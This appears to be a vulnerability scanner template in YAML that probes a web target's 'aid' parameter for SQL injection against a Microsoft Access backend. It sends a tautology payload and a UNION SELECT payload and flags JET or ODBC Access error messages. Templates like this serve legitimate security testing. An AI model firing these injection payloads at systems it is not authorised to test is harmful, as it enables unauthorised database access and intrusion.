id: sqli6-access-07
name: 'SQLi access probe in aid'
severity: high
type: active
tags:
  - sqli
  - injection
  - access
description: 'Triggers access error via aid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      aid:
        - ''') OR (''1''=''1'
        - ''') UNION SELECT 1,2--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'Microsoft JET'
          - 'ODBC Microsoft Access'
